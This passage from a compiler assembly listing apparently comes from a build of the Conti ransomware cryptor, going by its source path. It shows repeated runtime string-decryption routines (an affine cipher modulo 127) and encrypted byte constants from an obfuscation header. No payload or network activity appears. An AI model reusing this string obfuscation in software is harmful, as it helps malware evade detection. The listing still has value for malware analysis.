  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<79,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EP@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EP@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<79,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<79,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 35	 mov	 BYTE PTR [rcx+1], 53	; 00000035H
  00007	c6 41 02 66	 mov	 BYTE PTR [rcx+2], 102	; 00000066H
  0000b	c6 41 03 7a	 mov	 BYTE PTR [rcx+3], 122	; 0000007aH
  0000f	c6 41 04 66	 mov	 BYTE PTR [rcx+4], 102	; 00000066H
  00013	c6 41 05 4d	 mov	 BYTE PTR [rcx+5], 77	; 0000004dH
  00017	c6 41 06 66	 mov	 BYTE PTR [rcx+6], 102	; 00000066H
  0001b	c6 41 07 01	 mov	 BYTE PTR [rcx+7], 1
  0001f	c6 41 08 66	 mov	 BYTE PTR [rcx+8], 102	; 00000066H
  00023	c6 41 09 66	 mov	 BYTE PTR [rcx+9], 102	; 00000066H
  00027	c6 41 0a 66	 mov	 BYTE PTR [rcx+10], 102	; 00000066H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0EP@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<79,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<79,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CJ@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<41,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0c 00 00
	00		 mov	 r11d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 79	 sub	 ecx, 121		; 00000079H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1f	 imul	 r8d, ecx, 31

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<41,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CJ@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CJ@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<41,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<41,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 66	 mov	 BYTE PTR [rcx+1], 102	; 00000066H
  00007	c6 41 02 79	 mov	 BYTE PTR [rcx+2], 121	; 00000079H
  0000b	c6 41 03 33	 mov	 BYTE PTR [rcx+3], 51	; 00000033H
  0000f	c6 41 04 79	 mov	 BYTE PTR [rcx+4], 121	; 00000079H
  00013	c6 41 05 47	 mov	 BYTE PTR [rcx+5], 71	; 00000047H
  00017	c6 41 06 79	 mov	 BYTE PTR [rcx+6], 121	; 00000079H
  0001b	c6 41 07 12	 mov	 BYTE PTR [rcx+7], 18
  0001f	c6 41 08 79	 mov	 BYTE PTR [rcx+8], 121	; 00000079H
  00023	c6 41 09 58	 mov	 BYTE PTR [rcx+9], 88	; 00000058H
  00027	c6 41 0a 79	 mov	 BYTE PTR [rcx+10], 121	; 00000079H
  0002b	c6 41 0b 79	 mov	 BYTE PTR [rcx+11], 121	; 00000079H
  0002f	c6 41 0c 79	 mov	 BYTE PTR [rcx+12], 121	; 00000079H
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0CJ@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<41,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<41,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<101,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 08 00 00
	00		 mov	 r10d, 8
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 54 00 00 00	 mov	 eax, 84			; 00000054H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2c	 imul	 ecx, eax, 44		; 0000002cH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<101,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<101,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<101,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 1f	 mov	 BYTE PTR [rcx+1], 31
  00007	c6 41 02 54	 mov	 BYTE PTR [rcx+2], 84	; 00000054H
  0000b	c6 41 03 74	 mov	 BYTE PTR [rcx+3], 116	; 00000074H
  0000f	c6 41 04 54	 mov	 BYTE PTR [rcx+4], 84	; 00000054H
  00013	c6 41 05 7d	 mov	 BYTE PTR [rcx+5], 125	; 0000007dH
  00017	c6 41 06 54	 mov	 BYTE PTR [rcx+6], 84	; 00000054H
  0001b	c6 41 07 54	 mov	 BYTE PTR [rcx+7], 84	; 00000054H
  0001f	c6 41 08 54	 mov	 BYTE PTR [rcx+8], 84	; 00000054H
  00023	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00027	48 8b c1	 mov	 rax, rcx
  0002a	c3		 ret	 0
??0?$MetaBuffer@$0GF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<101,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<101,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<17,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 14 00 00
	00		 mov	 r11d, 20
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 4b	 sub	 ecx, 75			; 0000004bH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 0f	 imul	 r8d, ecx, 15

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<17,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<17,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::MetaBuffer<17,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 5f	 mov	 BYTE PTR [rcx+1], 95	; 0000005fH
  00007	c6 41 02 4b	 mov	 BYTE PTR [rcx+2], 75	; 0000004bH
  0000b	c6 41 03 7d	 mov	 BYTE PTR [rcx+3], 125	; 0000007dH
  0000f	c6 41 04 4b	 mov	 BYTE PTR [rcx+4], 75	; 0000004bH
  00013	c6 41 05 5b	 mov	 BYTE PTR [rcx+5], 91	; 0000005bH
  00017	c6 41 06 4b	 mov	 BYTE PTR [rcx+6], 75	; 0000004bH
  0001b	c6 41 07 06	 mov	 BYTE PTR [rcx+7], 6
  0001f	c6 41 08 4b	 mov	 BYTE PTR [rcx+8], 75	; 0000004bH
  00023	c6 41 09 52	 mov	 BYTE PTR [rcx+9], 82	; 00000052H
  00027	c6 41 0a 4b	 mov	 BYTE PTR [rcx+10], 75	; 0000004bH
  0002b	c6 41 0b 0f	 mov	 BYTE PTR [rcx+11], 15
  0002f	c6 41 0c 4b	 mov	 BYTE PTR [rcx+12], 75	; 0000004bH
  00033	c6 41 0d 0e	 mov	 BYTE PTR [rcx+13], 14
  00037	c6 41 0e 4b	 mov	 BYTE PTR [rcx+14], 75	; 0000004bH
  0003b	c6 41 0f 7c	 mov	 BYTE PTR [rcx+15], 124	; 0000007cH
  0003f	c6 41 10 4b	 mov	 BYTE PTR [rcx+16], 75	; 0000004bH
  00043	c6 41 11 5a	 mov	 BYTE PTR [rcx+17], 90	; 0000005aH
  00047	c6 41 12 4b	 mov	 BYTE PTR [rcx+18], 75	; 0000004bH
  0004b	c6 41 13 4b	 mov	 BYTE PTR [rcx+19], 75	; 0000004bH
  0004f	c6 41 14 4b	 mov	 BYTE PTR [rcx+20], 75	; 0000004bH
  00053	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00057	48 8b c1	 mov	 rax, rcx
  0005a	c3		 ret	 0
??0?$MetaBuffer@$0BB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<17,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::MetaBuffer<17,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BN@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<29,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 12 00 00
	00		 mov	 r10d, 18
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 34 00 00 00	 mov	 eax, 52			; 00000034H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 23	 imul	 ecx, eax, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<29,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BN@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BN@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<29,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::MetaBuffer<29,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >, COMDAT

; 55   : 
